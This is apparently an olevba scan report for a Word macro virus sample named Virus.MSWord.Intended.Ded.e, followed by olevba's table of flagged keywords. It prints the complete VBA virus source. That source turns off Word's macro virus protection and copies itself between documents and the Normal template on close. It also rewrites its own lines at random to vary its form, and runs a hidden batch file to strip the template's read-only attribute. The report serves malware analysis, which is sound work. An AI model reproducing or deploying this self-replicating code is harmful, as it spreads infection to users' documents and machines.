olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Ded.e-278f2aa42c969075362ba235d80057e4bc24c0ee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Ded.e-278f2aa42c969075362ba235d80057e4bc24c0ee - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Swlabs 99!

On Error GoTo skam

Options.VirusProtection = False

SWLABS99

skam:
End Sub
 
'Copy From Normal to Active
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            d = e(d)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
'Copy From Active to Normal
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    f (NormalTemplate.FullName)
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            d = e(d)
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub

'Make the Code Polymorphic
Private Function e(aString) As String
For i = 1 To Len(aString) - 1
    While Mid(aString, i, 2) = "  "
        aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)
    Wend
    If Mid(aString, i, 1) = "." Then
        If Not Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then
            If Not Mid(aString, i + 1, 1) = Chr$(34) Then
                e = Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)
                For j = 1 To Int(15 * Rnd)
                    e = " " & e
                Next j
                Exit Function
            End If
        End If
    Else
        If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then
            If Not Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then
                e = Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)
                For j = 1 To Int(15 * Rnd)
                    e = " " & e
                Next j
                Exit Function
            End If
        End If
    End If
Next i
e = aString & Chr$(13) & "'" & (100 * Rnd)
Count = Int(15 * Rnd)
For j = 1 To Count
    e = " " & e
Next j
End Function

' Undo Read Only in the File
Private Sub f(fName)
If GetAttr(fName) And vbReadOnly Then
    Open Dir(fName) & ".bat" For Append As #1
        Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)
        Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)
    Close #1
    shellResult = Shell(Dir(fName) & ".bat", vbHide)
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

